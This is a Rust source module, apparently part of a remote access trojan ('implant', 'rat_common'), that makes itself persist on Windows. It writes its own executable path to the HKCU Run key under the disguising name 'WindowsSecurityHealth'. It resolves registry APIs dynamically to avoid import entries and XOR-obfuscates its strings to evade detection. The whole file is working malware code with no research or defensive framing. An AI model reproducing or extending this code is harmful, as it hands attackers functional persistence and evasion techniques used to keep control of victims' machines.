//! Registry-based persistence via dynamically resolved APIs.
//!
//! Adds the implant to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
//! using a benign-looking value name.
//!
//! This module is only compiled on Windows.

#![cfg(target_os = "windows")]

use crate::dynapi::RegistryApis;
use std::ffi::CString;

/// HKEY_CURRENT_USER constant.
const HKCU: usize = 0x80000001;
/// KEY_SET_VALUE access right.
const KEY_SET_VALUE: u32 = 0x0002;
/// REG_SZ type.
const REG_SZ: u32 = 1;

/// Install persistence by adding a Run key entry.
///
/// All API calls are resolved dynamically to avoid static import entries.
/// String arguments are XOR-obfuscated at compile time.
pub fn install() -> Result<(), &'static str> {
    let apis = RegistryApis::resolve().ok_or("failed to resolve registry APIs")?;

    // Get current executable path
    let exe_path = std::env::current_exe()
        .map_err(|_| "failed to get exe path")?
        .to_string_lossy()
        .into_owned();

    // Decrypt registry subkey at runtime
    let subkey_bytes =
        rat_common::obfuscate!("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let subkey =
        CString::new(subkey_bytes).map_err(|_| "invalid subkey string")?;

    // Decrypt value name (looks legitimate)
    let name_bytes = rat_common::obfuscate!("WindowsSecurityHealth");
    let value_name =
        CString::new(name_bytes).map_err(|_| "invalid value name")?;

    let exe_cstr = CString::new(exe_path.as_bytes()).map_err(|_| "invalid exe path")?;

    unsafe {
        let mut key_handle: usize = 0;

        let rc = (apis.reg_open_key_ex_a)(
            HKCU,
            subkey.as_ptr() as *const u8,
            0,
            KEY_SET_VALUE,
            &mut key_handle,
        );

        if rc != 0 {
            return Err("RegOpenKeyExA failed");
        }

        let rc = (apis.reg_set_value_ex_a)(
            key_handle,
            value_name.as_ptr() as *const u8,
            0,
            REG_SZ,
            exe_cstr.as_ptr() as *const u8,
            (exe_path.len() + 1) as u32,
        );

        (apis.reg_close_key)(key_handle);

        if rc != 0 {
            return Err("RegSetValueExA failed");
        }
    }

    Ok(())
}
